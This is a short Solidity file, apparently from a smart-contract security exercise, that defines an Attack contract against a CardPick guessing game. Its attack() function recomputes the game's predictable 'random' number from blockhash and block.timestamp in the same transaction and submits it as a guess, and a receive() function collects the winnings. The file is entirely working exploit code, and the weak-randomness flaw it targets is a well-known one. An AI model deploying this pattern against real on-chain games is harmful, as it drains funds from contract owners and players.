// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./CardPick.sol";

contract Attack {
    CardPick cardpick;

    constructor(address gameAddress) {
        cardpick = CardPick(gameAddress);
    }

    function attack() public {
        uint256 _guess = uint256(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        cardpick.guess(_guess);
    }

    receive() external payable{}
}